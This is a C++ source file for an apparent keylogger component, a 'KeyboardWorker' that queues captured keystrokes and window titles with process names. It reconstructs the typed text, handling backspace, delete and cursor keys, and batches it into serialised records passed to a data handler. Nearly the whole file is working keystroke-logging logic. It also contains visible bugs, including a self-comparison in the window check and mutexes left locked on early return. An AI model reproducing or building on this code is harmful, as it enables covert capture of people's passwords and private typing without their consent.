#pragma once
#include "kbdworker.h"
#include "lrcdatahandler.h"
#include "lrcdatawriter.hpp"
#include "winfx.hpp"
#include "settings.h"

#include <mutex>
#include <atomic>
#include <chrono>
#include <queue>
#include <list>

using namespace Services;
using namespace LRCData;

namespace
{
	std::atomic_bool isRunning;

	const size_t maxRepeats = 5;
	const size_t eventsToProcess = 20;

	std::queue<PartKeyboard> pkQueue;
	std::list<PartKeyboard> pkList;

	std::mutex stateMutex;
	std::mutex pkQueueMutex;

	std::thread queueWorkerThread;

	size_t pkListCursorBegin;
	size_t pkListCursor;

	size_t vkRepeats;

	VKInfo lastVKInfo;
	WNDInfo lastWNDInfo;

	LRCDataWriter writer(Settings::sha256ID);

	// Compares two VKInfo structures
	inline bool VKInfoCmp(VKInfo vk1, VKInfo vk2)
	{
		return (vk1.keyCode == vk2.keyCode && vk1.lang == vk2.lang && vk1.flags == vk2.flags);
	}

	// Compares two WNDInfo structures
	inline bool WNDInfoCmp(WNDInfo wnd1, WNDInfo wnd2)
	{
		return (wnd1.title == wnd2.title && wnd2.processName == wnd2.processName);
	}

	// Is virtual key appends text into text fields
	inline bool isprintable(const DWORD vkCode)
	{
		return (vkCode == 0x20)						// Spacebar
			|| (vkCode >= 0x30 && vkCode <= 0x5A)	// 0 - 9, A - Z
			|| (vkCode >= 0x60 && vkCode <= 0x6F)	// Numpad keys
			|| (vkCode >= 0xBA && vkCode <= 0xE2);	// Different signs ([]'\;/.`)
	}

	void init()
	{
		pkListCursorBegin = 0;
		pkListCursor = 0;

		vkRepeats = 0;

		lastVKInfo.keyCode = 0;
		lastVKInfo.lang = 0;
		lastVKInfo.flags = 0;

		lastWNDInfo.title = L"";
		lastWNDInfo.processName = L"";

		pkList.clear();
	}

	void saveList()
	{
		ByteVector result = writer.GetBytes(pkList);
		LRCDataHandler::Process(result);

		init();
	}

	void resetCursor()
	{
		pkListCursor = pkListCursorBegin = pkList.size();
	}

	void eraseLeft()
	{
		if (pkListCursor > pkListCursorBegin)
		{
			std::list<PartKeyboard>::iterator it = pkList.begin();
			std::advance(it, pkListCursor - 1);
			pkList.erase(it);
			pkListCursor--;
		}
	}

	void eraseRigth()
	{
		if (pkListCursor < pkList.size())
		{
			std::list<PartKeyboard>::iterator it = pkList.begin();
			std::advance(it, pkListCursor);
			pkList.erase(it);
		}
	}

	void processVKInfo(PartKeyboard pk)
	{
		// Filter virtual-key repeats
		if (VKInfoCmp(pk.vkInfo, lastVKInfo))
		{
			if (vkRepeats != maxRepeats)
			{
				vkRepeats++;
			}
			else
			{
				return;
			}
		}
		else
		{
			vkRepeats = 0;
			lastVKInfo = pk.vkInfo;
		}

		if (isprintable(pk.vkInfo.keyCode))
		{
			// Insert 'pk' into 'pkList'
			std::list<PartKeyboard>::iterator it = pkList.begin();
			std::advance(it, pkListCursor);
			pkList.insert(it, pk);

			// Increment cursor counters
			pkListCursor++;
		}
	}

	void processWNDInfo(PartKeyboard pk)
	{
		resetCursor();

		if (!WNDInfoCmp(lastWNDInfo, pk.wndInfo))
		{
			pkList.push_back(pk);
		}

		lastWNDInfo = pk.wndInfo;

	}

	void processPartKeyboard(PartKeyboard pk)
	{
		switch (pk.subtype)
		{
		case LRCDATA_KEYBOARD_SUBTYPE_VKINFO:
			switch (pk.vkInfo.keyCode)
			{
			case VK_BACK:
				eraseLeft();
				break;
			case VK_DELETE:
				eraseRigth();
				break;
			case VK_UP:
				// Point cursor to the start
				pkListCursor = pkListCursorBegin;
				break;
			case VK_DOWN:
				// Point cursor to the end
				pkListCursor = pkList.size();
				break;
			case VK_LEFT:
				// Shift virtual-key cursor to left if cursor isn't at begining
				if (pkListCursor > pkListCursorBegin)
				{
					pkListCursor--;
				}
				break;
			case VK_RIGHT:
				// Shift virtual-key cursor to right if cursor isn't at end
				if (pkListCursor < pkList.size())
				{
					pkListCursor++;
				}
				break;
			default:
				processVKInfo(pk);
				break;
			}
			break;
		case LRCDATA_KEYBOARD_SUBTYPE_WNDINFO:
			processWNDInfo(pk);
			break;
		}
	}

	void queueWorker()
	{
		while (isRunning.load())
		{
			pkQueueMutex.lock();
			bool pkQueueEmpty = pkQueue.empty();
			pkQueueMutex.unlock();

			if (!pkQueueEmpty)
			{
				pkQueueMutex.lock();
				PartKeyboard pk = pkQueue.front();
				pkQueue.pop();
				pkQueueMutex.unlock();

				processPartKeyboard(pk);

				if (pkList.size() >= eventsToProcess)
				{
					saveList();
				}

				std::this_thread::sleep_for(std::chrono::milliseconds(5));
			}
			else
			{
				std::this_thread::sleep_for(std::chrono::milliseconds(25));
			}
		}
	}
}

void KeyboardWorker::Run()
{
	stateMutex.lock();

	if (isRunning.load())
	{
		return;
	}

	isRunning.store(true);

	init();
	queueWorkerThread = std::thread(queueWorker);

	stateMutex.unlock();
}

void KeyboardWorker::Stop()
{
	stateMutex.lock();

	if (!isRunning.load())
	{
		return;
	}

	isRunning.store(false);

	queueWorkerThread.join();

	stateMutex.unlock();
}

bool KeyboardWorker::IsRunning()
{
	return isRunning.load();
}

void KeyboardWorker::Add(VKInfo vkInfo)
{
	PartKeyboard pk;
	pk.subtype = LRCDATA_KEYBOARD_SUBTYPE_VKINFO;
	pk.vkInfo = vkInfo;

	pkQueueMutex.lock();
	pkQueue.push(pk);
	pkQueueMutex.unlock();
}


void KeyboardWorker::Add(LRCData::WNDInfo wndInfo)
{
	PartKeyboard pk;
	pk.subtype = LRCDATA_KEYBOARD_SUBTYPE_WNDINFO;
	pk.wndInfo = wndInfo;

	pkQueueMutex.lock();
	pkQueue.push(pk);
	pkQueueMutex.unlock();
}